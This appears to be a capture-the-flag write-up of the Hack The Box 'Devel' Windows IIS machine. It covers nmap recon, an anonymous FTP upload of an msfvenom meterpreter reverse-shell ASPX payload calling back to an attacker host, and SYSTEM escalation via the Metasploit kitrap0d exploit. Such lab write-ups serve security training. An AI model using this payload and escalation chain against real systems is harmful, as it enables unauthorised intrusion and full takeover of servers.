![devel](https://user-images.githubusercontent.com/66635295/176747179-515a7195-1782-4254-a173-23b18a86530a.png)

**RECON**
---
**IIS Server (Windows)**

![recon](https://user-images.githubusercontent.com/66635295/176748219-b064f388-d683-4c33-bb29-52c20d8961c2.png)

**Nmap Scan**
<pre>nmap –p- -A -T4 10.10.10.5</pre>
-allports -version -Aggressive
Port 21 allows for anonymous FTP Login

![nmap](https://user-images.githubusercontent.com/66635295/176748164-8d9bc8c3-02b3-4001-9ead-c9a2e7b90d0e.png)

**ENUMERATION**
---
**FTP Login** 
<pre>User: anonymous</pre>
<pre>Pass: anonymous</pre>
The connection allows files to be uploaded

![ftp](https://user-images.githubusercontent.com/66635295/176749228-6da8577b-6f75-41f9-a2a1-9ec36a6cc287.png)

**Msfvenom Payload**
<pre> -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f aspx > ex aspx </pre>
![msf](https://user-images.githubusercontent.com/66635295/176749731-c01f10d3-5894-4363-ab9c-08b91a0c0d61.png)

**Metasploit Listner**
<pre>use exploit/multi/handler</pre>
<pre>set payload windows/meterpreter/reverse_tcp</pre>
<pre>set LHOST 10.10.14.9</pre>
![msf consoel](https://user-images.githubusercontent.com/66635295/176750030-1de89e38-2ce4-46b8-9934-5bf80018e2b5.png)

FTP Upload
<pre>binary</pre>
Binary is more reliable than ASCII

![binary](https://user-images.githubusercontent.com/66635295/176751701-f44d6a90-93e3-4937-ab12-c4d92f0137e0.png)

<pre>put ex.aspx</pre>
Uploads the file to 10.10.10.5/ex.aspx

![ex](https://user-images.githubusercontent.com/66635295/176751874-9fdd0d59-5380-40a9-b910-e72ebe2600ac.png)

**PRIVILEGE ESCALATION**
---
**Meterpreter session**
<pre>getuid</pre>
Accessing the webpage provides a session to the application server  

![succ](https://user-images.githubusercontent.com/66635295/176753250-c97e1bdb-8d68-4274-8b61-4232a3343fca.png)

**Exploit suggestor**
<pre>backround</pre>
<pre>use post/multi/recon/local_exploit_suggester</pre>
<pre>set session 1</pre>
<pre>run</pre>
![sugg](https://user-images.githubusercontent.com/66635295/176753936-0f153344-9e85-4c34-a1d5-0e5b7cf8a6f9.png)

**Exploit list**
13 possible exploits found
![exploit](https://user-images.githubusercontent.com/66635295/176754492-af9345d4-e291-4828-aba1-9ff9cbf18696.png)

Exploit
<pre>use exploit windows/local/ms10_015_kitrap0d</pre>
<pre>set options</pre>
<pre>run</pre>
Creates a new session with SYSTEM privileges
![shelld](https://user-images.githubusercontent.com/66635295/176754686-000b763f-7ae4-43ab-8bcd-01692a5a11cc.png)
![swag](https://user-images.githubusercontent.com/66635295/176754750-d8f63b76-aed9-4088-b88e-ea164f55d797.png)
**Root shell**
<pre>shell</pre>
![shellll](https://user-images.githubusercontent.com/66635295/176754848-78819fce-4e69-40b0-9bb1-0dd217271dd8.png)
![flags](https://user-images.githubusercontent.com/66635295/176754936-eedc3dbf-0a4a-4f8a-8e92-c9c973ec486d.png)
